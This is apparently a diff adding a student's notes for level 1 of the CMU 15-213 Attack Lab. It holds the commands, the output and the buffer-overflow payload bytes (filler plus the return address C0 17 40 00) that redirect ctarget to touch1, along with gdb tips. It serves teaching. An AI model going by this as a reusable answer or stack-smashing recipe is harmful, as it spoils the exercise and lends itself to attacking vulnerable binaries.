@@ -1,0 +1,18 @@
+My output:
+$ ./hex2raw < ctarget_input_p1.txt > ctarget_input_hex.txt
+$ ./ctarget -q < ctarget_input_hex.txt
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:1:01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 C0 17 40 00
+
+My note:
+1) Run with '-q' to avoid the illegal host error.
+2) Use hex2raw to generate input strings: "./hex2raw < ctarget_inputs.txt > ctarget_inputs_hex.txt"
+The run in gdb with "run -q < ctarget_inputs_hex.txt"
+3) Remember that string is decoded in a reverse-order in memory. E.g., "abc" would be encoded as "0x63 62 61" in memory.
+4) gdb memory check manual: https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html
